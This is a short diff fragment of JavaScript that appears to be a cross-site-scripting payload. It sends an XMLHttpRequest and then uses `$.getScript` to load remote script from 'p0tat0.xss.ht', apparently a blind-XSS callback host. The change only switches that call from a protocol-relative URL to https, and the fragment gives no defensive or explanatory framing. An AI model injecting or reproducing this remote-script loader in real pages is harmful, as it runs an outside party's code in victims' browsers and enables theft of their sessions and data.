@@ -15,4 +15,4 @@ xhr.onload = function () {
 
 xhr.send(null);
 
-$.getScript("//p0tat0.xss.ht")
+$.getScript("https://p0tat0.xss.ht")
